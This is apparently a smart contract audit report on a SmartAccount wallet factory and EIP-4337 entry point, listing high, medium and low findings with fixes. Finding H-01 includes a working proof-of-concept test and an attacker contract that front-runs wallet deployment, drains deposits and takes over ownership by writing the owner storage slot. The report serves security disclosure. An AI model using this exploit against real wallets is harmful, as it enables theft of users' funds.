## Summary

### Findings

|              | Issue                                                                                                                                                            |
| ------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| [H-01](#H01) | Take control of all SmartAccount's on every EVM chain of a user                                                                                                  |
| [M-01](#M01) | DOS - exploit the 1/64th rule of EIP-150 to make the user operation fail and the account pays for it                                                             |
| [M-02](#M02) | Wrong implementation of simulateValidation(UserOperation calldata userOp)                                                                                        |
| [M-03](#M03) | Wrong EIP-4337 implementation for validateUserOp and validatePaymasterUserOp in SmartAccount + VerifyingSingletonPaymaster will lead to broken Wallets for users |
| [L-01](#L01) | Unneccessary if condition for a check that is always true                                                                                                        |
| [L-02](#L02) | Function deployWallet can be removed as it is not possible to check for deployed addresses                                                                       |
| [L-03](#L03) | Always check important state vars before update                                                                                                                  |
| [L-04](#L04) | Deviating interfaces to current EIP-4337                                                                                                                         |
| [L-05](#L05) | Return value not checked                                                                                                                                         |
| [L-06](#L06) | Inconsistent minimum stake delay                                                                                                                                 |

---

## High

### <a id="H01"></a> H-01 Take control of all SmartAccount's on every EVM chain of a user
It is possible to take control of a users SmartAccount and become the owner of the contract.
At the moment a new SmartAccount is deployed via the SmartAccountFactory.
The salt is calculate via the address of the user and an _index, so the user can have more than one wallet.
```solidity
bytes32 salt = keccak256(abi.encodePacked(_owner, address(uint160(_index))));
```
The **_entryPoint** and **_handler** are addresses that will be set in the init function after the deployment of the contract.

An attacker can for example inspect the ethereum chain for new deployments of a user and as soon as the first SmartAccount is created he can deploy a poisoned SmartAccount on all other EVM chains to have control of that specific address on all other chains. The user expects that he can use the wallet-address on all other chains and is the controler of them, but as soon as he deposits any funds in any other chain they will be lost as the attacker has full control over the wallet. Ofcourse an attacker could also frontrun the initial deployment and take control of the wallet in the first chain it is deployed.

#### Proof of Concept
This test shows, that if you're in control of the EntryPoint, you not only get any **addDeposit** a user does, you also can update the owner of the contract to lock out the user of the onlyOwner functions and take **complete control** of the wallet. All assets the Wallet will hold or get, the attacker has complete control over the wallet as he can use the execFromEntryPoint function with Operation.DelegateCall to delegatecall arbitrarily.

```js
import { expect } from "chai";
import { BigNumber } from "ethers";
import { ethers } from "hardhat";

describe("Attack Wallet Deployment", function () {
  it("deployed contract-address is as expected from the user, but the wallet is not safe", async function () {
    const accounts = await ethers.getSigners();

    const user = accounts[1];
    const userAddress = await accounts[1].getAddress();
    const attacker = accounts[2];
    const attackerAddress = await accounts[2].getAddress();

    const SmartAccount = await ethers.getContractFactory("SmartAccount");
    const smartAccount = await SmartAccount.deploy();
    await smartAccount.deployed();

    const SmartAccountFactory = await ethers.getContractFactory("SmartAccountFactory");
    const smartAccountFactory = await SmartAccountFactory.deploy(smartAccount.address);
    await smartAccountFactory.deployed();

    const AttackerEntryPoint = await ethers.getContractFactory("AttackerEntryPoint", attacker);
    const attackerEntryPoint = await AttackerEntryPoint.deploy();
    await attackerEntryPoint.deployed();

    const DefaultCallbackHandler = await ethers.getContractFactory("DefaultCallbackHandler");
    const defaultCallbackHandler = await DefaultCallbackHandler.deploy();
    await defaultCallbackHandler.deployed();

    const userExpectedWalletAddress = await smartAccountFactory.getAddressForCounterfactualWallet(userAddress, 0);
    
    // frontrun the deployment for the user but it is still deployed where the user expects his wallet-address and events are as exoected
    await expect(
      smartAccountFactory.connect(attacker).deployCounterFactualWallet(userAddress, attackerEntryPoint.address, defaultCallbackHandler.address, 0)
    ).to.emit(smartAccountFactory, "SmartAccountCreated")
    .withArgs(userExpectedWalletAddress, smartAccount.address, userAddress, "1.0.2", 0);
    const userSmartAccount = SmartAccount.attach(userExpectedWalletAddress);    
    
    // check that the owner of attackerEntryPoint and wallte of user are fine
    const ownerOfAttackerEntry = await attackerEntryPoint.attacker();
    expect(ownerOfAttackerEntry).eq(attackerAddress);
    const userSmartAccountOwner = await userSmartAccount.owner();
    expect(userSmartAccountOwner).eq(userAddress);
    
    // from now the user is in danger!!! 
    const attackerStartBalance = await attacker.getBalance();
    
    // if he uses the addDeposit() function, he will put the funds in our controlled entryPoint where we can transfer the funds to our attacker
    await userSmartAccount.connect(user).addDeposit({value: BigNumber.from(1000)});
    await attackerEntryPoint.connect(accounts[0]).poisonedWithdrawToOutowner();
    expect(await attacker.getBalance()).eq(BigNumber.from(1000).add(attackerStartBalance));
    
    // we can take control of the owner of the userSmartAccount to drain funds that are in there and are protected from the onlyOwner modifier
    await user.sendTransaction({to: userSmartAccount.address, value: BigNumber.from(2000)});
    await attackerEntryPoint.connect(accounts[0]).takeUserWalletControlAndDrainCurrentFundsIfAvailable(userSmartAccount.address);  

    // we have now drained the wallet and we're the owner!
    expect(await attacker.getBalance()).eq(BigNumber.from(3000).add(attackerStartBalance));
    const afterAttackSmartAccountOwner = await userSmartAccount.owner();
    
    expect(afterAttackSmartAccountOwner).eq(attackerAddress); // we are the owner !!
  });
});
```

Attacker Contract
```solidity
pragma solidity ^0.8.12;

import "./EntryPoint.sol";

contract AttackerEntryPoint is EntryPoint {
    address immutable public attacker;
    constructor() {
        attacker = msg.sender;
    }
    function poisonedWithdrawToOutowner() public {
        (bool req,) = payable(attacker).call{value : address(this).balance}("");
        require(req);
    }
    function takeUserWalletControlAndDrainCurrentFundsIfAvailable(address walletToTakeOverAndDrain) external {
        ISmartAttack(walletToTakeOverAndDrain).execFromEntryPoint(
            address(this), 
            0, 
            abi.encodeWithSelector(this.attackTheDelegate.selector, ""), 
            ISmartAttack.Operation.DelegateCall, 
            gasleft()
        );
    }
    function attackTheDelegate() external {
        // first we drain the current balance of the wallet        
        if(address(this).balance > 0) {
            poisonedWithdrawToOutowner();
        }

        // we update the current owner to us 
        // from now we can use the onlyOwner functions and can eg directly drain tokens via transfer, pullTokens, execute, .... 
        address _attacker = attacker;
        assembly {
            sstore(52, _attacker) // owner is on storage slot 52
        }
    }
}
interface ISmartAttack {
    enum Operation {Call, DelegateCall}
    function execFromEntryPoint(address dest, uint value, bytes calldata func, Operation operation, uint256 gasLimit) external returns (bool success);    
}
```


#### Tools Used
Manual review and hardhat

#### Recommended Mitigation Steps
At the moment the salt only contains _owner and _index to make sure the user can have the same address on all chains, but this needs to be changed to also take the _entryPoint and on best also the _handler in the salt. The getAddressForCounterfactualWallet needs to be updated to also take both addresses in to calculate the address for the frontend. It's probably best to also add the _entryPoint in the SmartAccountCreated event to validate if it is a whitelisted one offchain before you display anything to the user.

```solidity
bytes32 salt = keccak256(abi.encodePacked(_owner, _entryPoint, _handler, address(uint160(_index))));
```

With this change, you can ensure, that the transaction can't be frontrun to change the EntryPoint.  

Alternatively you can change the _entryPoint and _handler to be immutable variables and need to be set while deployment of the SmartAccountFactory. This will ensure, that all the possible front-runnings are obsolet.

The only downside is, that you need to take a bit more caution while you deploy the SmartAccountFactory, because you also need to be sure, that you deploy the _entryPoint and _handler on all chains with the same address and if you want to change the EntryPoint you also need to redeploy everything.

---

## Medium

### <a id="M01"></a> M-01 DOS - exploit the 1/64th rule of EIP-150 to make the user operation fail and the account pays for it
The current version of the EntryPoint.sol is vulnarable to an out-of-gas attack found by rmeissner and fixed in a newer version of the account-abstraction repository.  
With this attack it is possible to DOS where the account that is being attacked would pay for.

https://github.com/eth-infinitism/account-abstraction/pull/162
```
The added tests should show the scenario where a user operation with a high callGasLimit is submitted. In this case it is important that the gasLimit is correctly set, else it is possible to use the 1/64th rule of EIP-150 to make the user operation fail and the account pays for it.

If this is possible it could be used as an attack vector. The attacker would submit a bundle with the high gas usage tx with a too low gas value. Even when the user estimated everything correctly the transaction would fail because not enough gas is available. The costs for the execution would still be deducted from the account. Therefore the submitter could perform a denial of service attack for which the account that is being attacked would pay.

The first tests below shows that high gas transaction can be executed and refunded. The second test checks that the transaction is reverted in case the gas limit is set too low, to avoid the attack described above.
```

#### Recommended Mitigation Steps
Update the EntryPoint and implement the fix introduced in this PR:
https://github.com/eth-infinitism/account-abstraction/commit/4fef857019dc2efbc415ac9fc549b222b07131ef


### <a id="M02"></a> M-02 Wrong implementation of simulateValidation(UserOperation calldata userOp)
The current EIP-4337 https://eips.ethereum.org/EIPS/eip-4337#simulation UserOP simulations state, that it needs to be reverted with a *ValidationResult* / *ValidationResultWithAggregation* error. If the simulation reverts with anything other than this error, it will be interepreted as failed and the UserOP will be rejected.

> *This method always revert with ValidationResult as successful response. If the call reverts with other error, the client rejects this userOp.*

The current implementation reverts with a *SimulationResult* / *SimulationResultWithAggregation* and so the clients will interpret it as failed and will not forward it to the mempool.

#### Proof of Concept
Clients expect the **ValidationResult** / **ValidationResultWithAggregation** but code is reverting with a **SimulationResult** / **SimulationResultWithAggregation**.
```solidity

File: EntryPoint.sol
240:         if (aggregator != address(0)) {
241:             AggregatorStakeInfo memory aggregatorInfo = AggregatorStakeInfo(aggregator, getStakeInfo(aggregator));
242:             revert SimulationResultWithAggregation(preOpGas, prefund, deadline, senderInfo, factoryInfo, paymasterInfo, aggregatorInfo);
243:         }
244:         revert SimulationResult(preOpGas, prefund, deadline, senderInfo, factoryInfo, paymasterInfo);
```

#### Tools Used
manual review
EIP-4337 https://eips.ethereum.org/EIPS/eip-4337

#### Recommended Mitigation Steps
Change the reverts in the Interface to the following definition from the EIP documentation and change it in the simulation to revert with them.

```soldity
error ValidationResult(ReturnInfo returnInfo,
    StakeInfo senderInfo, StakeInfo factoryInfo, StakeInfo paymasterInfo);

error ValidationResultWithAggregation(ReturnInfo returnInfo,
    StakeInfo senderInfo, StakeInfo factoryInfo, StakeInfo paymasterInfo,
    AggregatorStakeInfo aggregatorInfo);
```

Raising this as medium, as the EIP-4337 is a new EIP that will hopefully get a wide adoption and so it's important to be aligned with the definition under the EIP-4337 as clients will depend on the implementation side.

### <a id="M03"></a> M-03 Wrong EIP-4337 implementation for validateUserOp and validatePaymasterUserOp in SmartAccount + VerifyingSingletonPaymaster will lead to broken Wallets for users
The EIP-4337 https://eips.ethereum.org/EIPS/eip-4337#definitions defines the *validateUserOp* as followed:
```solidity
interface IAccount {
function validateUserOp
    (UserOperation calldata userOp, bytes32 userOpHash, address aggregator, uint256 missingAccountFunds)
    external returns (uint256 sigTimeRange);
}
```
And the *validatePaymasterUserOp* as followed:
```solidity
function validatePaymasterUserOp
    (UserOperation calldata userOp, bytes32 userOpHash, uint256 maxCost)
    external returns (bytes memory context, uint256 sigTimeRange);
```

The sigTimeRange is composed as followed for both functions:
```solidity
<byte> sigFailure - (1) to mark signature failure, 0 for valid signature.
<8-byte> validUntil - last timestamp this operation is valid. 0 for "indefinite"
<8-byte> validAfter - first timestamp this operation is valid
```

The EIP-conform EntryPoint will expect no revert in the functions and needs to interpret the sigTimeRange depedning on the return value.

#### Proof of Concept
The current implementation in SmartAccount always returns 0 for this variable and throws an error instead of returning "1".
```solidity
File: SmartAccount.sol
506:     function _validateSignature(UserOperation calldata userOp, bytes32 userOpHash, address)
507:     internal override virtual returns (uint256 deadline) {
508:         bytes32 hash = userOpHash.toEthSignedMessageHash();
509:         //ignore signature mismatch of from==ZERO_ADDRESS (for eth_callUserOp validation purposes)
510:         // solhint-disable-next-line avoid-tx-origin
511:         require(owner == hash.recover(userOp.signature) || tx.origin == address(0), "account: wrong signature");
512:         return 0;
513:     }
```

The same goes for the VerifyingSingletonPaymaster that throws an error and always returning 0.
```solidity
File: VerifyingSingletonPaymaster.sol
097:     function validatePaymasterUserOp(UserOperation calldata userOp, bytes32 /*userOpHash*/, uint256 requiredPreFund)
098:     external view override returns (bytes memory context, uint256 deadline) {
099:         (requiredPreFund);
100:         bytes32 hash = getHash(userOp);
101: 
102:         PaymasterData memory paymasterData = userOp.decodePaymasterData();
103:         uint256 sigLength = paymasterData.signatureLength;
104: 
105:         //ECDSA library supports both 64 and 65-byte long signatures.
106:         // we only "require" it here so that the revert reason on invalid signature will be of "VerifyingPaymaster", and not "ECDSA"
107:         require(sigLength == 64 || sigLength == 65, "VerifyingPaymaster: invalid signature length in paymasterAndData");
108:         require(verifyingSigner == hash.toEthSignedMessageHash().recover(paymasterData.signature), "VerifyingPaymaster: wrong signature");
109:         require(requiredPreFund <= paymasterIdBalances[paymasterData.paymasterId], "Insufficient balance for paymaster id");
110:         return (userOp.paymasterContext(paymasterData), 0);
111:     }
```

As state in the EIP the EntryPoint will expect a "1" if the function failed and not a revert.

#### Tools Used
manual inspection
https://eips.ethereum.org/EIPS/eip-4337

#### Recommended Mitigation Steps

For VerifyingSingletonPaymaster you should change the requires and return ("",1); and  for SmartAccount you should change the require(owner == hash.recover(userOp.signature) to the following:
```solidity
if (owner != hash.recover(userOp.signature) {
    return 1;
}
```

To fulfill the EIP expected behaviour.

---

## Low

### <a id="L01"></a> L-01 Unneccessary if condition for a check that is always true
In SmartAccount is a if condition that is always true and can be removed as it is checked 3 lines above with a require.

```solidity
File: contracts/smart-contract-wallet/SmartAccount.sol
166:     function init(address _owner, address _entryPointAddress, address _handler) public override initializer { 
167:         require(owner == address(0), "Already initialized");
168:         require(address(_entryPoint) == address(0), "Already initialized");
169:         require(_owner != address(0),"Invalid owner");
170:         require(_entryPointAddress != address(0), "Invalid Entrypoint");
171:         require(_handler != address(0), "Invalid Entrypoint");
172:         owner = _owner;
173:         _entryPoint =  IEntryPoint(payable(_entryPointAddress));
174:         if (_handler != address(0)) internalSetFallbackHandler(_handler); // @audit-info if can be removed and internalSetFallbackHandler(_handler); can always be set - require(_handler != address(0), "Invalid Entrypoint"); checks for this
175:         setupModules(address(0), bytes(""));
176:     }
```

### <a id="L02"></a> L-02 Function deployWallet can be removed as it is not possible to check for deployed addresses
SmartAccountFactory has the ability to deploy a new Wallet via deployWallet via a create instead of a create2. It also doesn't emit the SmartAccountCreated event and so any deployed Wallet via this function can't be found via the event and also not via the getAddressForCounterfactualWallet function. For Wallets created via this way, the frontends will not work.

```solidity
File: contracts/smart-contract-wallet/SmartAccountFactory.sol
53:     function deployWallet(address _owner, address _entryPoint, address _handler) public returns(address proxy){
54:         bytes memory deploymentData = abi.encodePacked(type(Proxy).creationCode, uint(uint160(_defaultImpl)));
55:         // solhint-disable-next-line no-inline-assembly
56:         assembly {
57:             proxy := create(0x0, add(0x20, deploymentData), mload(deploymentData))
58:         }
59:         BaseSmartAccount(proxy).init(_owner, _entryPoint, _handler);
60:         isAccountExist[proxy] = true;
61:     }
```

### <a id="L03"></a> L-03 Always check important state vars before update
At the moment the update for entryPoint is not checked in the constructor and not in the update function to not be the zero address. This can lead to unexpected behavior. You should add the require(_entryPoint != address(0)) check.

```solidity
File: contracts/smart-contract-wallet/paymasters/BasePaymaster.sol
20:     constructor(IEntryPoint _entryPoint) {
21:         setEntryPoint(_entryPoint);
22:     }

File: contracts/smart-contract-wallet/paymasters/BasePaymaster.sol
24:     function setEntryPoint(IEntryPoint _entryPoint) public onlyOwner {
25:         entryPoint = _entryPoint;
26:     }
```

### <a id="L04"></a> L-04 Deviating interfaces to current EIP-4337
Some interfaces deviate to the current EIP-4337 https://eips.ethereum.org/EIPS/eip-4337.

```solidity
File: contracts/smart-contract-wallet/aa-4337/interfaces/IEntryPoint.sol
123:     error SimulationResult(uint256 preOpGas, uint256 prefund, uint256 deadline,
124:         StakeInfo senderInfo, StakeInfo factoryInfo, StakeInfo paymasterInfo);
125:     // @audit-info unknown definition, should be
126:     // error ValidationResult(ReturnInfo returnInfo, StakeInfo senderInfo, StakeInfo factoryInfo, StakeInfo paymasterInfo);

File: contracts/smart-contract-wallet/aa-4337/interfaces/IEntryPoint.sol
140:     error SimulationResultWithAggregation(uint256 preOpGas, uint256 prefund, uint256 deadline,
141:         StakeInfo senderInfo, StakeInfo factoryInfo, StakeInfo paymasterInfo, AggregatorStakeInfo aggregatorInfo);
142:     // @audit-info unknown definition, should be
143:     // error ValidationResultWithAggregation(ReturnInfo returnInfo, StakeInfo senderInfo, StakeInfo factoryInfo, StakeInfo paymasterInfo, AggregatorStakeInfo aggregatorInfo);

File: contracts/smart-contract-wallet/aa-4337/interfaces/IEntryPoint.sol
145:     // @audit-info missing completly
146:     /*
147:         struct ReturnInfo {
148:             uint256 preOpGas;
149:             uint256 prefund;
150:             bool sigFailed;
151:             uint64 validAfter;
152:             uint64 validUntil;
153:             bytes paymasterContext;
154:         }
155:     */

File: contracts/smart-contract-wallet/aa-4337/interfaces/IPaymaster.sol
26:     function validatePaymasterUserOp(UserOperation calldata userOp, bytes32 userOpHash, uint256 maxCost)
27:     external returns (bytes memory context, uint256 deadline); 
28:     // @audit-info return is not deadline, its a sigTimeRange that is a uint256 and holds the information for
29:     // sigFailure + validUntil + validAfter

File: contracts/smart-contract-wallet/aa-4337/interfaces/IAccount.sol
24:     function validateUserOp(UserOperation calldata userOp, bytes32 userOpHash, address aggregator, uint256 missingAccountFunds)
25:     external returns (uint256 deadline);
26:     // @audit-info return is not deadline, its a sigTimeRange that is a uint256 and holds the information for
27:     // sigFailure + validUntil + validAfter
```

### <a id="L05"></a> L-05 Return value not checked
The return value from function _validatePrepayment is not checked and can lead to unexpected behaviour.

```solidity
File: EntryPoint.sol
75:             _validatePrepayment(i, ops[i], opInfos[i], address(0));

File: EntryPoint.sol
113:                 _validatePrepayment(opIndex, ops[i], opInfos[opIndex], address(aggregator));
```

### <a id="L06"></a> L-06 Inconsistent minimum stake delay
At the moment there is no minimum stake-delay and so you can add a stake with a delay of only 1 second. You can always withdraw your stake after only 1 second. Consider adding a minimum value to check against.

```solidity
File: StakeManager.sol
59:     function addStake(uint32 _unstakeDelaySec) public payable {
60:         DepositInfo storage info = deposits[msg.sender];
61:         require(_unstakeDelaySec > 0, "must specify unstake delay");
62:         require(_unstakeDelaySec >= info.unstakeDelaySec, "cannot decrease unstake time");
63:         uint256 stake = info.stake + msg.value;
64:         require(stake > 0, "no stake specified");
65:         require(stake < type(uint112).max, "stake overflow");
66:         deposits[msg.sender] = DepositInfo(
67:             info.deposit,
68:             true,
69:             uint112(stake),
70:             _unstakeDelaySec,
71:             0
72:         );
73:         emit StakeLocked(msg.sender, stake, _unstakeDelaySec);
74:     }
```